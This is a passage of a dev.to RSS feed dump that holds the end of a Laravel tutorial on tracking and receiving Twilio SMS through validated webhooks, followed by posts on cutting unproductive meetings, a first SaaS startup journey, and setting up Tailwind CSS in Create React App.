&lt;p&gt;If we want to keep track of an SMS status we have to provide a &lt;a href="https://medium.com/r/?url=https%3A%2F%2Fsupport.twilio.com%2Fhc%2Fen-us%2Farticles%2F360008989454-Tracking-the-Delivery-Status-of-an-Outbound-Twilio-SMS-or-MMS-Message"&gt;statusCallback&lt;/a&gt; parameter on each request. The statusCallback will be the URL to a webhook in our application that will be prepared to receive requests from Twilio.&lt;/p&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Create TwilioSms Model and TwilioSmsLog Model.&lt;/strong&gt;&lt;br&gt;
TwilioSms will represent a Twilio SMS in our application and TwilioSmsLog will represent each event related to an SMS (status change, error, etc).&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;php artisan make:model TwilioSms -m
php artisan make:model TwilioSmsLog -m
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;Models&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;p&gt;Migrations&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;
&lt;br&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Create status callback webhook route and implement Twilio Request Validation middleware.&lt;/strong&gt;&lt;br&gt;
Add new webhook url to api routes.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/**
 * Twilio statusCallBack webhook
 * is-twilio-request middleware makes sure only twilio has access to this route
 */
Route::any('/twilio/webhook/status-changed', [TwilioController::class, 'statusChanged'])-&amp;gt;middleware(['is-twilio-request'])-&amp;gt;name('api.twilio.status-changed');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;Notice that we are using the middleware &lt;strong&gt;is-twilio-request&lt;/strong&gt;. This route will be open to the public so we need to make sure that it only serves valid requests from Twilio. We can accomplish that by using the RequestValidator method provided by the Twilio PHP SDK.&lt;/p&gt;

&lt;p&gt;Create Middleware&lt;br&gt;
&lt;code&gt;php artisan make:middleware TwilioRequestIsValid&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;p&gt;Add the new middleware to app/Http/Kernel.php $routeMiddleware array.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/**
 * The application's route middleware.
 *
 * These middleware may be assigned to groups or used individually.
 *
 * @var array
 */
protected $routeMiddleware = [
    ...
    'is-twilio-request' =&amp;gt; \App\Http\Middleware\TwilioRequestIsValid::class,
];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Update Twilio Service. Add status callback, create TwilioSmsModel on send and log.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;TwilioService final version:&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;p&gt;Now every time we make a sendMessage request the following will happen:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Add callback URL to sendMessage request.&lt;/li&gt;
&lt;li&gt;If the request was successful create TwilioSms record on DB.&lt;/li&gt;
&lt;li&gt;Create TwilioSmsLog.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Created message.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--t16OgREb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oufbeit656idc0ifjzy1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--t16OgREb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oufbeit656idc0ifjzy1.png" alt="Created message" width="800" height="38"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Created log.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rtF3QdPv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s5uuxsqcvp091spwjmkz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--rtF3QdPv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s5uuxsqcvp091spwjmkz.png" alt="Created log" width="800" height="53"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;4. Handle Twilio Status Changed Request.&lt;/strong&gt;&lt;br&gt;
Add statusChanged Method to TwilioSmsController. The logic is just an example of implementation. You can make any adjustment as long as you &lt;strong&gt;return response(['success' =&amp;gt; true], 200)&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;In summary, we log every request and if we can match the request with an SMS in our application and the request status is different from the current TwilioSms status we update it.&lt;/p&gt;

&lt;p&gt;TwilioSmsController with status changed method:&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt;With the webhook in place, we will start to see our messages go through different states. It usually just takes a few seconds to go from queued to sent.&lt;/p&gt;

&lt;p&gt;It will look like this in the database.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Z9ABHoR6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2pm4v44trvmemsoazo42.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Z9ABHoR6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2pm4v44trvmemsoazo42.png" alt="logs" width="700" height="76"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That’s it for it tracking SMS status changes and keeping an updated representation of each Twilio SMS sent by the application. The next step is to receive and store messages.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#%C2%A0"&gt;
  &lt;/a&gt;
   
&lt;/h2&gt;
&lt;h2&gt;
  &lt;a href="#receive-sms"&gt;
  &lt;/a&gt;
  Receive SMS
&lt;/h2&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Create messageReceived method on TwilioSmsController.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;TwilioSmsController final version:&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Add webhook route.&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;...
...
/**
* Twilio message received webhook
* is-twilio-request middleware makes sure only twilio has access to this route
*/
Route::any('/twilio/webhook/message-received', [TwilioSmsController::class, 'messageReceived'])
-&amp;gt;middleware(['is-twilio-request'])
-&amp;gt;name('api.twilio.message-received');
...
...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt; &lt;br&gt;
&lt;strong&gt;3. Add webhook URL to a phone number in Twilio console.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Find your phone number details page.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ZLJKnDKs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i3jf4lii8wnyi04vpztz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ZLJKnDKs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i3jf4lii8wnyi04vpztz.png" alt="console" width="228" height="549"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Click on the phone number you want to manage and then find the Messaging section on the details page. Here you can define a “&lt;strong&gt;message comes in&lt;/strong&gt;” action. Select webhook and input your webhook URL.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8h_Lr01t--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dfwgoqxy856esd6q7337.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8h_Lr01t--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dfwgoqxy856esd6q7337.png" alt="message webhook" width="700" height="249"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Save and you are all set to start receiving SMS in your application.&lt;/p&gt;

&lt;p&gt;Whenever a message comes in we are going to create a TwilioSms record and a TwilioSmsLog record.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--y3sb7tO8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xn3ypv9tjfzz4ueosee7.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--y3sb7tO8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xn3ypv9tjfzz4ueosee7.png" alt="sms" width="700" height="71"&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--o8o-bgGr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g12u0dt0i8i5qmow0zrh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--o8o-bgGr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g12u0dt0i8i5qmow0zrh.png" alt="log" width="700" height="62"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#%C2%A0"&gt;
  &lt;/a&gt;
   
&lt;/h2&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;We accomplished:&lt;/strong&gt;&lt;br&gt;
✅ Send SMS.&lt;br&gt;
✅ Track Sent SMS Status.&lt;br&gt;
✅ Keep local updated representation of a Twilio SMS.&lt;br&gt;
✅ Every time a Twilio phone receives a message we get it and store it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Possible gotchas:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Test with phone numbers in E.164 formatting.&lt;/li&gt;
&lt;li&gt;Trial phone numbers can only send messages to verified numbers.&lt;/li&gt;
&lt;li&gt;Sometimes sending a message to a region is disabled, so you have to enable the region on the Twilio console.&lt;/li&gt;
&lt;li&gt;Webhook URL must be publicly accessible. No auth. Not behind a server configuration restriction.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope this article was helpful.&lt;/p&gt;

&lt;p&gt;If you have any feedback or found mistakes, please don’t hesitate to reach out to me.&lt;/p&gt;

</description>
      <category>laravel</category>
      <category>twilio</category>
      <category>php</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Avoiding Bad Meetings and What to Do When You’re in One</title>
      <author>Status Hero Editorial Staff</author>
      <pubDate>Tue, 14 Dec 2021 23:31:07 +0000</pubDate>
      <link>https://dev.to/statushero/avoiding-bad-meetings-and-what-to-do-when-youre-in-one-4fep</link>
      <guid>https://dev.to/statushero/avoiding-bad-meetings-and-what-to-do-when-youre-in-one-4fep</guid>
      <description>&lt;p&gt;&lt;strong&gt;Meetings are essential for enabling collaboration, creativity, and fostering relationships. But having too many meetings kills productivity, drains morale, and generates stress and frustration.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Meetings—or at least the benefits they bring—are an important part of working in a team environment. Unfortunately, as businesses and teams grow, the number of meetings tends to also grow, sometimes to the point of becoming unmanageable. Many of these meetings might not even be productive.&lt;/p&gt;

&lt;p&gt;Having too many meetings has &lt;a href="https://hbr.org/2017/07/stop-the-meeting-madness"&gt;real consequences&lt;/a&gt; for teams and organizations. They can drain employees, destroying their morale and motivation. These meetings leave people with little time to get other, productive tasks done. As a result, they can waste company time and cost money because of the work lost.&lt;/p&gt;

&lt;p&gt;Meetings are still necessary for the members of an organization to collaborate and work well together. The &lt;a href="https://statushero.com/blog/on-meetings-and-wasting-time/"&gt;key is to not waste people's time&lt;/a&gt;. In this article, you will learn some steps to help reduce the flood of meetings faced by many knowledge workers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-you-need-to-cancel-some-meetings"&gt;
  &lt;/a&gt;
  Why You Need to Cancel Some Meetings
&lt;/h2&gt;

&lt;p&gt;Holding too many meetings will exert a collective toll on productivity, focus, and engagement at your organization. When people sacrifice their time and well-being for meetings, they assume they are doing what is best for the business and they may not see the larger costs.&lt;/p&gt;

&lt;p&gt;Below are some use cases for why having too many meetings can be detrimental.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#too-much-talking-not-enough-doing"&gt;
  &lt;/a&gt;
  Too Much Talking, Not Enough Doing
&lt;/h3&gt;

&lt;p&gt;To be productive, &lt;a href="https://statushero.com/blog/time-to-think/"&gt;people need uninterrupted periods to stay in deep work mode&lt;/a&gt;. Every minute spent in a wasteful meeting takes away from solo work that is essential for creativity and efficiency. Broken-up schedules interrupt deep thinking, so people end up coming to work early, staying late, or using weekends to get some quiet time to concentrate. This is not sustainable and over time will kill creativity. Such a dysfunctional meeting culture can &lt;a href="https://hbr.org/2017/07/stop-the-meeting-madness"&gt;lower organizations’ market share, innovation, and employment stability&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#calendar-overload"&gt;
  &lt;/a&gt;
  Calendar Overload
&lt;/h3&gt;

&lt;p&gt;Sometimes employees’ calendars are filled with ceremonial meetings they must attend without understanding their benefit. Being forced to attend unnecessary meetings can result in information overload, as attendees take in details they do not necessarily need to know about to do their jobs. The time spent in those meetings can prevent them from completing their day-to-day responsibilities, causing them to feel they have failed. This in turn can affect their productivity and how well they’re able to collaborate with others. The damage can be far-reaching. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#higher-stress-levels"&gt;
  &lt;/a&gt;
  Higher Stress Levels
&lt;/h3&gt;

&lt;p&gt;Meetings are supposed to improve communication and collaboration in an organization. However, too many bad meetings can undermine those same things, adding stress and anxiety to already stressed-out employees. An employee may worry about missing a deadline because she was in meetings most of the week. Another employee may be uncomfortable with giving frequent presentations to his co-workers but be expected to do it anyway. These issues can affect employee happiness at work.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-to-reduce-your-meetings"&gt;
  &lt;/a&gt;
  How to Reduce Your Meetings
&lt;/h2&gt;

&lt;p&gt;Meetings at an organization are necessary for collaboration and to reach consensus. They encourage creative thinking and help attendees discover new ideas. You cannot get rid of meetings completely if you want your organization to function well. However, if meeting overload is becoming a problem for your business, you can control it. &lt;/p&gt;

&lt;p&gt;Below are suggestions to help reduce your meetings while making them more productive and useful for you and your team.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#require-an-agenda"&gt;
  &lt;/a&gt;
  Require an Agenda
&lt;/h3&gt;

&lt;p&gt;An agenda highlights the purpose of a meeting and helps invited attendees decide whether they need to participate. It can be as brief as a few sentences describing the purpose of the meeting and stating a clear objective. If a meeting doesn’t have a set goal or a need for an action plan, chances are it isn’t necessary. &lt;/p&gt;

&lt;p&gt;Ideally, you should create the agenda a few days in advance of the meeting. Share it with the other participants so they can come prepared with talking points, questions, and situations to discuss. This ensures everyone can make the best use of their time during the meeting.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#reserve-meetingfree-time"&gt;
  &lt;/a&gt;
  Reserve Meeting-free Time
&lt;/h3&gt;

&lt;p&gt;People are most productive when they have blocks of uninterrupted time to get some deep work done. To achieve this, reserve some meeting-free time on your calendar. Some organizations encourage people to block out focus time so that colleagues know not to interrupt them. Other organizations establish &lt;a href="https://statushero.com/blog/increasing-focus-with-no-meeting-days/"&gt;meeting free days&lt;/a&gt; so all employees can focus more fully on their work. &lt;/p&gt;

&lt;p&gt;People’s brains are &lt;a href="https://www.inc.com/larry-kim/why-multi-tasking-is-killing-your-brain.html"&gt;not wired to multitask&lt;/a&gt;. When workers batch tasks together, they’re able to increase their focus, remove distractions, and stay in the right flow state. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#use-asynchronous-meetings"&gt;
  &lt;/a&gt;
  Use Asynchronous Meetings
&lt;/h3&gt;

&lt;p&gt;Synchronous meetings require everyone to be present in real-time, which means all attendees must block out that time simultaneously. This is the case whether the meeting is in person, over the phone, or on Zoom. Asynchronous communication, for instance through email, a messaging app, or a project management tool, allows people to communicate on their own schedule. They can answer or ask questions without fear of being interrupted, and absorb the new information when they’re ready. This method is especially beneficial if your team members are in different time zones or countries.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#make-attendance-optional"&gt;
  &lt;/a&gt;
  Make Attendance Optional
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://hbr.org/2018/06/5-common-complaints-about-meetings-and-what-to-do-about-them"&gt;One of the biggest complaints&lt;/a&gt; about meetings is that attendees don’t get value from them. They can’t contribute meaningfully to the discussion, and they don’t get any insights. When calling a meeting, make sure that only the people who need to be there are invited. &lt;/p&gt;

&lt;p&gt;Large meetings are good if the meeting is designed to broadly share information, such as reporting quarterly earnings. But in a planning meeting where decisions need to be made, having fewer people on hand may be better. Otherwise, the discussion could veer too far off topic and accomplish little. Team members who aren’t essential to the meeting should either be left off the invitation or told the meeting is optional. You can send out meeting notes afterward to those who don’t attend.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#present-a-video-or-email"&gt;
  &lt;/a&gt;
  Present a Video or Email
&lt;/h3&gt;

&lt;p&gt;Rather than taking the time to hold a meeting, you could save time by using a different medium. Informational meetings, for example, are meant to share details about a decision that has already been made. In this case, consider sending a video or email and documenting the information in your company wiki.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#schedule-shorter-meetings"&gt;
  &lt;/a&gt;
  Schedule Shorter Meetings
&lt;/h3&gt;

&lt;p&gt;Meetings don’t have to take up the full scheduled time. If you’ve gone through all the talking points and assigned all action items, there’s no need to sit around. Most people are more than happy to leave a meeting earlier than expected. Not every meeting needs to be an hour or even thirty minutes. Experiment with keeping some of your meetings under twenty minutes. This is enough time to be taken seriously, but short enough to maintain people’s attention, and it won’t interfere with your team’s schedule.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;Meetings are essential for enabling collaboration, creativity, and innovation. They often foster relationships and ensure proper information exchange. However, excessive meetings are costly and can lead to more problems than benefits for teams and organizations.&lt;/p&gt;

&lt;p&gt;At the end of the day, good work practices are about making the best use of everyone’s time. Better use of meetings will result in better work lives for everyone.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;By Veronica Stork. Veronica is a software engineer working primarily in React and JavaScript. When she’s not coding, she enjoys reading sci-fi novels, hanging out with her family, and exploring abandoned buildings.&lt;/em&gt;&lt;/p&gt;

</description>
      <category>management</category>
      <category>productivity</category>
      <category>culture</category>
    </item>
    <item>
      <title>My journey creating my first saas /startup in a few months pt.1</title>
      <author>Hrn Svncハルン Харун Севиндж</author>
      <pubDate>Tue, 14 Dec 2021 23:20:53 +0000</pubDate>
      <link>https://dev.to/harsvnc/my-journey-creating-my-first-saas-startup-in-a-few-months-pt1-fjk</link>
      <guid>https://dev.to/harsvnc/my-journey-creating-my-first-saas-startup-in-a-few-months-pt1-fjk</guid>
      <description>&lt;p&gt;Hi everyone, it's me again. Today I wanted to start sharing my journey, how I built my first saas startup in a few months (we started about 4 month ago)&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#finding-a-cofounder"&gt;
  &lt;/a&gt;
  Finding a co-founder
&lt;/h2&gt;

&lt;p&gt;Let's face it. You can't do everything. Or at least not efficiently in time. And time is one of the most valuable resources you have. That's why many founders will tell you to find a co-founder for your idea. In most cases a mix of technical and sales based skillset would be very helpful. &lt;/p&gt;

&lt;p&gt;Since I work as a developer, it seems easy to find someone else with a technical background. And that's how I met your... my co-founder.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#solving-a-real-problem"&gt;
  &lt;/a&gt;
  Solving a real problem
&lt;/h2&gt;

&lt;p&gt;There probably are a ton of todo apps out there. And thats okay. Everyone has its own preferences and tastes when choosing a new product. In many cases you will use the most famous product which seems to solve 80 % of the problem you face. With that said, a problem can also be solved in many different ways sometimes.&lt;/p&gt;

&lt;p&gt;We did find something that would be worth creating even if there are a lot of competition out there. We don't wanted to build just another products but one that solved a problem with a different approach.&lt;/p&gt;

&lt;p&gt;So why not building a todo app with KI or make it more fun to use by using it in a different way? I think you get the point. If you are able to create your unique selling point than do it. But don't forget to solve a real problem.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#dont-overengineer-your-mvp"&gt;
  &lt;/a&gt;
  Don't overengineer your MVP
&lt;/h2&gt;

&lt;p&gt;Stop building more features. Focus on one or two main features which create great results and release your product as soon as it is stable enough to serve. You always should weigh in if the time you spend for a new feature is worth it or just go ahead to the next one wich should generate value.&lt;/p&gt;

&lt;p&gt;We first started with an other product which we already discarded after we spend too much time thinking about it developing the first version. After reevaluating our product we knew we needed to move on.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#build-habbits"&gt;
  &lt;/a&gt;
  Build habbits
&lt;/h2&gt;

&lt;p&gt;I heard that if you do a task for 21 days repeatedly it turns into a habbit. When you build a product you need to be determined to finish it as soon as possible. That includes a lot of work, in my case programming sessions. I started one day and since we put our code on github, I can track how many commits I did in the past weeks. If I forget to code the other day, I feel bad and so I try to at least improve something small.&lt;/p&gt;

&lt;p&gt;This was my first part on how I startet building my first saas startup. If you liked this post you could follow me on &lt;a href="https://mobile.twitter.com/harsvnc"&gt;Twitter&lt;/a&gt; or here in Dev. I will continue posting about my process and hope I can provide you with my experience.&lt;/p&gt;

&lt;p&gt;Thanks for reading &lt;/p&gt;

</description>
      <category>saas</category>
      <category>devjournal</category>
      <category>beginners</category>
      <category>productivity</category>
    </item>
    <item>
      <title>Setup Tailwind with Create React App without craco.</title>
      <author>Cheralathan</author>
      <pubDate>Tue, 14 Dec 2021 22:41:57 +0000</pubDate>
      <link>https://dev.to/cheralathann/setup-tailwind-with-create-react-app-without-craco-ph7</link>
      <guid>https://dev.to/cheralathann/setup-tailwind-with-create-react-app-without-craco-ph7</guid>
      <description>&lt;h3&gt;
  &lt;a href="#what-is-tailwind"&gt;
  &lt;/a&gt;
  What is &lt;a href="https://tailwindcss.com/"&gt;tailwind&lt;/a&gt;?
&lt;/h3&gt;

&lt;p&gt;A utility-first CSS framework that can be composed to build any design, directly in your markup.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--RDfKCM1F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a71vmjh9mk547rr0r61n.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RDfKCM1F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a71vmjh9mk547rr0r61n.png" alt="Tailwind" width="498" height="280"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setting-up-tailwind-css"&gt;
  &lt;/a&gt;
  Setting up Tailwind CSS
&lt;/h2&gt;

&lt;p&gt;In this guide, we’ll cover a simple installation of Setting up Tailwind CSS in a Create React App project.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#uninstall-createreactapp-recommended"&gt;
  &lt;/a&gt;
  Uninstall create-react-app (recommended)
&lt;/h3&gt;

&lt;p&gt;If you've previously installed create-react-app globally. we recommend you uninstall the package using:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;npm uninstall -g create-react-app&lt;/code&gt; or &lt;code&gt;yarn global remove create-react-app&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#existing-react-project"&gt;
  &lt;/a&gt;
  Existing React Project
&lt;/h3&gt;

&lt;p&gt;Bump "react-scripts" in package.json to 5.0.0 and run &lt;code&gt;npm install&lt;/code&gt;. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#new-react-project"&gt;
  &lt;/a&gt;
  New React Project
&lt;/h3&gt;

&lt;p&gt;To create a new app use the following commands&lt;/p&gt;

&lt;p&gt;&lt;code&gt;npx create-react-app my-app&lt;/code&gt; or &lt;code&gt;yarn create react-app my-app&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Once new app is intialized go to the app directory, In our case &lt;code&gt;cd my-app&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#install-tailwind-css"&gt;
  &lt;/a&gt;
  Install Tailwind CSS
&lt;/h3&gt;

&lt;p&gt;Install tailwindcss and its peer dependencies via npm&lt;/p&gt;

&lt;p&gt;&lt;code&gt;npm install -D tailwindcss postcss autoprefixer&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#generate-config"&gt;
  &lt;/a&gt;
  Generate Config
&lt;/h3&gt;

&lt;p&gt;Then run the init command to generate both &lt;code&gt;tailwind.config.js&lt;/code&gt; and &lt;code&gt;postcss.config.js&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;npx tailwindcss init -p&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#configure-your-template-paths"&gt;
  &lt;/a&gt;
  Configure your template paths
&lt;/h3&gt;

&lt;p&gt;Add the paths to all of your template files in your &lt;code&gt;tailwind.config.js&lt;/code&gt; file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;module.exports = {
  content: [
    "./src/**/*.{js,jsx}",
  ],
  ...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#add-the-tailwind-directives-to-your-css"&gt;
  &lt;/a&gt;
  Add the Tailwind directives to your CSS
&lt;/h3&gt;

&lt;p&gt;Add the tailwind directives for each of Tailwind’s layers to your &lt;code&gt;./src/index.css&lt;/code&gt; file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;@tailwind base;
@tailwind components;
@tailwind utilities;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#start-your-dev-process"&gt;
  &lt;/a&gt;
  Start your dev process
&lt;/h3&gt;

&lt;p&gt;Run your build process with &lt;code&gt;npm run start&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;That's all. Enjoy.&lt;/p&gt;

</description>
      <category>beginners</category>
      <category>tailwindcss</category>
      <category>react</category>
      <category>css</category>
    </item>
  </channel>
</rss>
